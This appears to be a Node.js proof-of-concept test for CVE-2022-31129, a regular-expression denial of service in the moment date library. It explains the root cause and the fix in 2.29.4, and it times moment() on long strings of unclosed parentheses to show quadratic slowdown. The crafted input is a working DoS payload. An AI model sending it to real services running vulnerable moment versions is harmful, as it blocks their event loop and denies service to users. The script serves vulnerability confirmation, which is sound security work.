// CVE-2022-31129 — moment ReDoS, isolated library test (NO HTTP path).
//
// moment has no reachable HTTP execution path in this app (see reachability
// section), so this measures the library in isolation to confirm the CVE is
// real, independent of application reachability.
//
// Root cause: moment(<string>) with no format falls back to RFC 2822 parsing,
// whose preprocessRFC2822() runs a comment-stripping regex /\([^)]*\)|[\n\t]/g.
// On a long run of unclosed '(' the engine rescans to end-of-string at every
// position -> O(n^2). Fixed in moment 2.29.4 by bounding the input.
//
// Usage: node moment_redos.js [length]   (default 20000)

const moment = require('moment');
moment.suppressDeprecationWarnings = true; // silence the RFC2822 fallback notice

const LEN = parseInt(process.argv[2], 10) || 20000;

function timeOnce(label, str) {
  const t0 = process.hrtime.bigint();
  moment(str); // single call, parsed in isolation
  const t1 = process.hrtime.bigint();
  const ms = Number(t1 - t0) / 1e6;
  console.log(
    label.padEnd(26),
    'len=' + String(str.length).padStart(7),
    ms.toFixed(1).padStart(8) + ' ms'
  );
  return ms;
}

console.log('moment version :', moment.version);
console.log('node version   :', process.version);
console.log('crafted input  : "(".repeat(' + LEN + ')  (unclosed parens)');
console.log('');

// Baseline: a normal, valid date string.
timeOnce('normal "2021-01-01"', '2021-01-01');

// Scaling: shows the quadratic growth, not a one-off number.
timeOnce('crafted x5000', '('.repeat(5000));
timeOnce('crafted x10000', '('.repeat(10000));
const headline = timeOnce('crafted x' + LEN, '('.repeat(LEN));

console.log('');
console.log('HEADLINE: one moment() call on a ' + LEN + '-char crafted string took '
  + headline.toFixed(1) + ' ms (single-threaded; blocks the event loop).');
